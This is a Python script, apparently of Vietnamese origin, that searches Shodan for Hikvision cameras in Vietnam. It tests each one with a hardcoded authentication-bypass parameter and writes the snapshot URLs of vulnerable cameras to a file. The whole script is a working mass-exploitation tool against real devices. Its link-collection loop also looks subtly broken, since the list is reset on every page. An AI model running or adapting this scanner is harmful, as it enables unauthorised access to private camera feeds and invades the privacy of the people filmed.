# Required libs: requests and shodan.
import requests
import shodan
import os

# Cau hinh
API_KEY = "API SHODAN"

# Danh sach dorks
dorks = ['''hikvision country:"VN" "Server: App-webs/"''']

exploitable = []
exploit_check = "/Security/users?auth=YWRtaW46MTEK"
get_snapshot = "/onvif-http/snapshot?auth=YWRtaW46MTEK"

# Tao doi tuong Shodan API
api = shodan.Shodan(API_KEY)

for dork in dorks:
    page = 1
    while True:
        try:
            result = api.search(dork, page=page)
            print(f"So ket qua tren trang {page}: {len(result['matches'])}")
            print(f"Tong so ket qua cho dork '{dork}': {result['total']}")

            list_of_links = []  # Reset danh sach lien ket cho tung trang

            for service in result['matches']:
                ipx = service['ip_str']
                portx = service['port']
                if portx == 80:
                    full = f"http://{ipx}"
                elif portx == 443:
                    full = f"https://{ipx}"
                else:
                    full = f"http://{ipx}:{portx}"
                
                list_of_links.append(full)

            if len(result['matches']) == 0:
                break  # Dung lai neu khong con ket qua tren trang nay

            page += 1  # Tang trang len de lay ket qua tiep theo

        except shodan.exception.APIError as e:
            print(f"Loi xay ra voi truy van '{dork}' tren trang {page}: {e}")
            break  # Dung lai hoac tiep tuc voi trang tiep theo tuy theo loi

    # Xu ly danh sach lien ket de kiem tra khai thac
    for link in list_of_links:
        try:
            x = requests.get(f'{link}{exploit_check}', timeout=3)
            if x.status_code == 200:
                exploitable_link = f'{link}{get_snapshot}'
                print(f"[+] Hit! {exploitable_link}")
                
                # Ghi ket qua vao tep ngay khi phat hien
                with open("hikvision.txt", "a") as file:
                    file.write(f"{exploitable_link}\n")
                
                exploitable.append(exploitable_link)
        except Exception as e:
            print(f"[-] Timed out ({link}): {e}")
            pass

print(f"Done! Ket qua da duoc ghi vao hikvision.txt. Tong so ket qua: {len(exploitable)}")
